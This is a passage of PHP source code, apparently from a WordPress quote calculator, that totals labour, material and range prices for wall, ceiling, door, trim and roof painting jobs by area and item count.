                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if( in_array($temp['title'],$new_walls) ) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $current_ceiling = $data['current_ceiling'];
                $current_ceiling_total = 0;
                foreach($current_ceiling_data as $temp) {
                        if( in_array($temp['title'],$current_ceiling) ) {


                                if($current_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_ceiling_total = $current_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($current_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_ceiling_total = $current_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }

                $ceiling_prep = $data['ceiling_prep'];
                $ceiling_prep_total = 0;
                foreach($ceiling_prep_data as $temp) {
                        if( in_array($temp['title'],$ceiling_prep) ) {


                                if($ceiling_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ceiling_prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ceiling_prep_total = $ceiling_prep_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($ceiling_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ceiling_prep_total = $ceiling_prep_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                 $new_ceiling = $data['new_ceiling'];
                $new_ceiling_total = 0;
                foreach($new_ceiling_data as $temp) {
                        if( in_array($temp['title'],$new_ceiling) ) {


                                if($new_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_ceiling_total = $new_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($new_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_ceiling_total = $new_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }

					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
	                              $painting_total = $current_walls_total + $wall_prep_total + $new_walls_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $new_ceiling_total + $trim_total;
                                $level_markup = $painting_total * $level_total / 100;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply + $level_markup;

                                $total = $total + $paint_room_total;


                }
	
	 // formulas for Office painting
        if(get_the_title($t) == 'Single Office') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'ceiling_height') {
                                                $height_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_ceiling') {
                                                $current_ceiling_title = $d['title'];
                                                $current_ceiling_prices = $d['type_of_price'];
                                                $current_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'ceiling_prep') {
                                                $ceiling_prep_title = $d['title'];
                                                $ceiling_prep_prices = $d['type_of_price'];
                                                $ceiling_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_ceiling') {
                                                $new_ceiling_title = $d['title'];
                                                $new_ceiling_prices = $d['type_of_price'];
                                                $new_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

                                $height = $data['ceiling_height'];
                                $height_total = 0;
                                foreach($height_data as $temp) {
                                        if( $temp['title'] == $height ) {

                                                $range_price_total = $temp['range_price'];
                                                $height_total = $height_total + $range_price_total;

                                        }
                                }

	                              $wall_area = ( $width + $width + $length + $length ) * $height_total;
                                $ceiling_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( in_array($temp['title'],$current_walls) ) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if( in_array($temp['title'],$new_walls) ) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $current_ceiling = $data['current_ceiling'];
                $current_ceiling_total = 0;
                foreach($current_ceiling_data as $temp) {
                        if( in_array($temp['title'],$current_ceiling) ) {


                                if($current_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_ceiling_total = $current_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($current_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_ceiling_total = $current_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }

                $ceiling_prep = $data['ceiling_prep'];
                $ceiling_prep_total = 0;
                foreach($ceiling_prep_data as $temp) {
                        if( in_array($temp['title'],$ceiling_prep) ) {


                                if($ceiling_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ceiling_prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ceiling_prep_total = $ceiling_prep_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($ceiling_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ceiling_prep_total = $ceiling_prep_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                 $new_ceiling = $data['new_ceiling'];
                $new_ceiling_total = 0;
                foreach($new_ceiling_data as $temp) {
                        if( in_array($temp['title'],$new_ceiling) ) {


                                if($new_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_ceiling_total = $new_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($new_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_ceiling_total = $new_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }

					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
	                              $painting_total = $current_walls_total + $wall_prep_total + $new_walls_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $new_ceiling_total + $trim_total;
                                $level_markup = $painting_total * $level_total / 100;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply + $level_markup;

                                $total = $total + $paint_room_total;


                }
       
            // formulas for Roof painting
        if(get_the_title($t) == 'Roof Price') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $length = $data['area_length'];

                                foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'type') {
                                                $type_title = $d['title'];
                                                $type_prices = $d['type_of_price'];
                                                $type_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'prep') {
                                                $prep_title = $d['title'];
                                                $prep_prices = $d['type_of_price'];
                                                $prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'scaffolding') {
                                                $scaffolding_title = $d['title'];
                                                $scaffolding_prices = $d['type_of_price'];
                                                $scaffolding_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'supply') {
                                                $supply_title = $d['title'];
                                                $supply_prices = $d['type_of_price'];
                                                $supply_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                           					}


                                $roof_area = $width * $length;
                                $outer_length = $width + $width + $length + $length;

                $type = $data['type'];
                $type_total = 0;
                foreach($type_data as $temp) {
                        if( in_array($temp['title'],$type) ) {


                                if($type_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$type_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $type_total = $type_total +  ( $labour_and_material_total * $roof_area);
                                }
                                elseif($type_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $type_total = $type_total + ( $range_price_total * $roof_area);
                                }

                        }

                }

                $prep = $data['prep'];
                $prep_total = 0;
                foreach($prep_data as $temp) {
                        if( in_array($temp['title'],$prep) ) {


                                if($prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $prep_total = $prep_total +  ( $labour_and_material_total * $roof_area);
                                }
                                elseif($prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $prep_total = $prep_total + ( $range_price_total * $roof_area);
                                }

                        }

                }


                $scaffolding = $data['scaffolding'];
                $scaffolding_total = 0;
                foreach($scaffolding_data as $temp) {
                        if( in_array($temp['title'],$scaffolding) ) {


                                if($scaffolding_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$scaffolding_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $scaffolding_total = $scaffolding_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($scaffolding_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $scaffolding_total = $scaffolding_total + ( $range_price_total * $outer_length);
                                }

                        }

                }

	              $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {


                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }

                $supply = $data['supply'];
                $supply_total = 0;
                foreach($supply_data as $temp) {
                        if( in_array($temp['title'],$supply) ) {


                                if($supply_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
